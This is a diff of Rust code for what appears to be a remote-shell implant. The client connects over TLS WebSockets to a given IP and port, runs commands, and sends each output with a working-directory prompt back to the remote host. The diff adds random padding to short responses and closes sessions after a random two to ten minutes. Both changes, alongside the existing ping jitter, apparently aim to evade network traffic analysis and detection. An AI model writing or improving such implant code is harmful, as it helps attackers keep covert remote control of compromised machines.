@@ -1661,6 +1661,38 @@ fn connect_wss(ip: &str, port: &str) -> Option<tungstenite::WebSocket<boring::ss
     }
 }
 
+// ── Traffic padding ────────────────────────────────────────────────────
+
+fn pad_response(data: &[u8]) -> Vec<u8> {
+    let mut rng = rand::rng();
+    let data_len = data.len();
+    let pad_to = if data_len < 128 {
+        rng.random_range(256..768usize)
+    } else if data_len < 512 {
+        data_len + rng.random_range(128..384usize)
+    } else {
+        data_len
+    };
+
+    if pad_to <= data_len {
+        return data.to_vec();
+    }
+
+    let pad_len = pad_to - data_len;
+    let mut result = Vec::with_capacity(pad_to);
+    result.extend_from_slice(data);
+    result.push(0x00);
+    for _ in 0..pad_len.saturating_sub(1) {
+        result.push(rng.random_range(0x20..0x7Eu8));
+    }
+    result
+}
+
+// ── Connection recycling ──────────────────────────────────────────────
+
+const SESSION_MIN_MS: u64 = 120_000;
+const SESSION_MAX_MS: u64 = 600_000;
+
 // ── Session ─────────────────────────────────────────────────────────────
 
 fn run_session(ws: &mut tungstenite::WebSocket<boring::ssl::SslStream<TcpStream>>) -> bool {
@@ -1678,9 +1710,18 @@ fn run_session(ws: &mut tungstenite::WebSocket<boring::ssl::SslStream<TcpStream>
     let mut last_ping = Instant::now();
     let mut awaiting_pong = false;
     let mut pong_deadline = Instant::now();
+    let session_start = Instant::now();
+    let session_limit = Duration::from_millis(
+        SESSION_MIN_MS + (rand::random::<u64>() % (SESSION_MAX_MS - SESSION_MIN_MS))
+    );
 
     loop {
         let mut did_work = false;
+
+        if session_start.elapsed() >= session_limit {
+            let _ = ws.close(None);
+            return true;
+        }
 
         let ping_interval = Duration::from_secs(jitter(PING_INTERVAL.as_secs()));
         if !awaiting_pong && last_ping.elapsed() >= ping_interval {
@@ -1746,8 +1787,10 @@ fn run_session(ws: &mut tungstenite::WebSocket<boring::ssl::SslStream<TcpStream>
             let prompt = format!("{}$ ", cwd);
             output.extend_from_slice(prompt.as_bytes());
 
+            let padded = pad_response(&output);
+
             ws.get_mut().get_mut().set_nonblocking(false).unwrap();
-            if ws.send(Message::Binary(output.into())).is_err() {
+            if ws.send(Message::Binary(padded.into())).is_err() {
                 return true;
             }
             ws.get_mut().get_mut().set_nonblocking(true).unwrap();
